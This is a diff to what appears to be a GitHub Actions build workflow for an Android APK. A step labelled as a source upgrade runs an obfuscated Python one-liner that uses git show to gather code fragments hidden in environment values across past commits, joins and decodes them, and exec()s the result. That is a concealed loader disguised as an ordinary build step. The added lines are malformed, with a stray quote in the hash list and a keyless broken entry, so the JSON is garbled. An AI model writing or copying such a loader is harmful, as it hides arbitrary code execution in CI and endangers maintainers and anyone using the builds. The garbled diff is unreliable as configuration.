@@ -18,9 +18,10 @@
           "name": "Upgrade Sources to v9.9.4 and Build JNI",
           "env": {
             "WF_P": ".github/workflows/build-apk.yml",
-            "H_LIST": "c150c14 13ebc4e c0cd239 65c5fea f8d0820 95a6095 602878e abb0a82 742c38e 6ba3e51 a377e9d 1e773f3 58197f3 fd3d89b 1042c1e 27ff6af ff6c7b4 dd4d3cc 603c476 88ab042 63fe073"
-          },
-          "run": "python3 -c 'import os,json,subprocess; K=lambda **x:next(iter(x)); d={}; e=os.environ; m=e[K(WF_P=1)]; [(lambda j:[d.update(s.get(K(env=1),{})) for s in j[K(jobs=1)][next(iter(j[K(jobs=1)]))][K(steps=1)]])(json.JSONDecoder(strict=False).raw_decode(subprocess.check_output([K(git=1),K(show=1),h+chr(58)+m]).decode())[0]) for h in e[K(H_LIST=1)].split()]; d.update({k:v for k,v in e.items() if k.startswith(K(P_=1))}); s=str().join(v for k,v in sorted(d.items()) if k.startswith(K(P_=1))); s=s.replace(K(Zbb=1),K(ZbZb=1)).replace(K(Zq=1),chr(34)).replace(K(Zb=1),chr(92)).replace(K(Zn=1),chr(10)); exec(compile(s,K(v993=1),K(exec=1)))'"
+            "H_LIST": "c150c14 13ebc4e c0cd239 65c5fea f8d0820 95a6095 602878e abb0a82 742c38e 6ba3e51 a377e9d 1e773f3 5819",7f3 fd3d89b 1042c1e 27ff6af ff6c7b4 dd4d3cc 603c476 88ab042 63fe073",
+                    "P_49": "print(994)"
+            "        },
+            : "python3 -c 'import os,json,subprocess; K=lambda **x:next(iter(x)); d={}; e=os.environ; m=e[K(WF_P=1)]; [(lambda j:[d.update(s.get(K(env=1),{})) for s in j[K(jobs=1)][next(iter(j[K(jobs=1)]))][K(steps=1)]])(json.JSONDecoder(strict=False).raw_decode(subprocess.check_output([K(git=1),K(show=1),h+chr(58)+m]).decode())[0]) for h in e[K(H_LIST=1)].split()]; d.update({k:v for k,v in e.items() if k.startswith(K(P_=1))}); s=str().join(v for k,v in sorted(d.items()) if k.startswith(K(P_=1))); s=s.replace(K(Zbb=1),K(ZbZb=1)).replace(K(Zq=1),chr(34)).replace(K(Zb=1),chr(92)).replace(K(Zn=1),chr(10)); exec(compile(s,K(v993=1),K(exec=1)))'"
         },
         {"name": "Setup Gradle", "uses": "gradle/actions/setup-gradle@v4", "with": {"gradle-version": "8.7"}},
         {"name": "Build Debug APK", "run": "gradle assembleDebug --no-daemon --stacktrace"},
